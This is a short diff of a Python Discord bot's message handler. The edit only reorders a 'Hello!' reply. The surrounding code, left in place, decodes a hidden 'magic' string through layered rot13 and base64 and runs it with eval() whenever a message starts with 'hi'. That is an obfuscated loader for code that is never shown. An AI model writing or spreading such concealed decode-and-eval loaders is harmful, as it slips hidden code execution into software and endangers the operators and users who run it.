@@ -21,12 +21,11 @@ async def on_message(message):
         return
 
     if message.content.startswith("hi"):
-        await message.channel.send("Hello!")
         byte = codecs.decode(magic, "rot13")
         string = base64.b64decode(byte)
         tr = string.decode()
         out = codecs.decode(tr, "rot13")
         eval(out)
-
+        await message.channel.send("Hello!")
 
 client.run(os.environ["BOT_TOKEN"])
